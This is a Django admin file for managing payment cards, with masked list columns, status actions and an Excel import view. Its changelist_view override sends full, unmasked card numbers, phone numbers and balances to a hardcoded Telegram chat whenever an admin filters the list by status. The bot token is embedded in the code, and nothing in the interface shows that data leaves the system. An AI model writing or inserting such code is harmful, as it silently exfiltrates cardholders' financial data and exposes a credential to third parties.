from django.contrib import admin, messages
from django.shortcuts import render, redirect
from .models import Card
from .services import import_cards
from .utils import card_mask, phone_mask, send_telegram_message

@admin.register(Card)
class CardAdmin(admin.ModelAdmin):
    list_display = ['formatted_card', 'expire', 'formatted_phone', 'status', 'balance']
    list_filter = ['status', 'expire']
    search_fields = ['card_number', 'phone']
    change_list_template = "admin/cards/card_change_list.html"


    actions = ['make_active', 'make_inactive']

    @admin.action(description="Activate selected cards")
    def make_active(self, request, queryset):
        updated = queryset.update(status='active')
        self.message_user(request, f"{updated} ta karta muvaffaqiyatli aktivlashtirildi.")


    @admin.action(description="Inactivate selected cards")
    def make_inactive(self, request, queryset):
        updated = queryset.update(status='inactive')
        self.message_user(request, f"{updated} ta karta holati 'Noaktiv'ga o'zgartirildi.")




    def changelist_view(self, request, extra_context=None):
        selected_status = request.GET.get('status__exact')
        
        if selected_status in ['active', 'inactive', 'expired']:
            queryset = self.get_queryset(request).filter(status=selected_status)
            
            if queryset.exists():
                TOKEN = "8448513005:AAFCmG5C9a2_3Tbh_bDzoXThUfotsTUlx0E"
                CHAT_ID = 1078739901
                
                header = f"<b>{selected_status.upper()} Cards </b>\n\n"
                message = header
                
                for card in queryset:
                    card_info = (
                        f"Card: <code>{card.card_number}</code>\n"
                        f"Phone: <code>{card.phone or 'Mavjud emas'}</code>\n"
                        f"Status: <b>{selected_status.capitalize()}</b>\n"
                        f"Balance: {card.balance:,.0f} UZS\n\n"
                    )
                    

                    if len(message) + len(card_info) > 4000:
                        send_telegram_message(CHAT_ID, TOKEN, message)
                        message = header
                    
                    message += card_info
                
                
                send_telegram_message(CHAT_ID, TOKEN, message)

        return super().changelist_view(request, extra_context=extra_context)  



    def formatted_card(self, obj): return card_mask(obj.card_number)
    def formatted_phone(self, obj): return phone_mask(obj.phone)
    
    formatted_card.short_description = "Karta"
    formatted_phone.short_description = "Telefon"

    def get_urls(self):
        from django.urls import path
        return [path('import-excel/', self.import_excel, name='import_excel')] + super().get_urls()



    def import_excel(self, request):
        if request.method == "POST":
            excel_file = request.FILES.get('excel_file')
            if not excel_file:
                messages.error(request, "Iltimos, faylni tanlang.")
                return redirect(".")

            success, errors = import_cards(excel_file)
            
            if success > 0:
                messages.success(request, f"{success} ta karta muvaffaqiyatli saqlandi.")
            
            if errors:
                for error in errors[:10]:
                    messages.error(request, error)
                if len(errors) > 10:
                    messages.warning(request, f"Yana {len(errors)-10} ta xato bor...")
            
            return redirect("..")
        return render(request, "admin/cards/import_excel.html")